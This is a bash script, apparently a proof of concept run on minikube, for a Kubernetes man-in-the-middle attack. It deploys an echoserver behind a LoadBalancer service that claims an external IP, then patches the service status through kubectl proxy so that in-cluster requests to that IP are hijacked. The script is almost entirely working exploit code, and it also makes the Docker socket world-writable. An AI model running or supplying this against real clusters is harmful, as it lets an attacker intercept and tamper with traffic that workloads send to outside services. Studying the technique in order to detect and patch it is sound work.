

sudo chmod 666 /var/run/docker.sock

minikube start

minikube version


ip="17.253.144.10"
echo "IP to mitm is: ${ip}"

curl -I $ip

echo "Creating a mitm server to intercept the traffic from other pods..."

kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Namespace
metadata:
  name: kubeproxy-mitm
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: echoserver
  namespace: kubeproxy-mitm
spec:
  replicas: 1
  selector:
    matchLabels:
      app: echoserver
  template:
    metadata:
      labels:
        app: echoserver
    spec:
      containers:
      - image: gcr.io/google_containers/echoserver:1.10
        name: echoserver
        ports:
        - name: http
          containerPort: 8080
        - name: https
          containerPort: 8443
EOF

echo "Creating a loadbalance service"

kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Service
metadata:
  name: mitm-sv
  namespace: kubeproxy-mitm
spec:
  ports:
  - name: http
    port: 80
    targetPort: 8080
  - name: https
    port: 443
    targetPort: 8443
  selector:
    app: echoserver
  type: LoadBalancer
  loadBalancerIP: $ip
EOF

echo "Starting proxy for communication..."

kubectl proxy --port=8080 & sleep 5

echo "Patching the service to fix pending external ip of the loadbalance. (Also a privilaged operation)"
curl -k -v -XPATCH  -H "Accept: application/json" -H "Content-Type: application/merge-patch+json" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-sv/status' -d '{"status":{"loadBalancer":{"ingress":[{"ip":"'"$ip"'" }]}}}'

echo "Now request from inside the container will be routed to our mitm server"
kubectl run --rm -i --tty curl --image=curlimages/curl --restart=Never -- curl -I "http://${ip}"

echo "Our deployed mitm echoserver should have hit. Hence a success"
#curl -I http://17.253.144.10
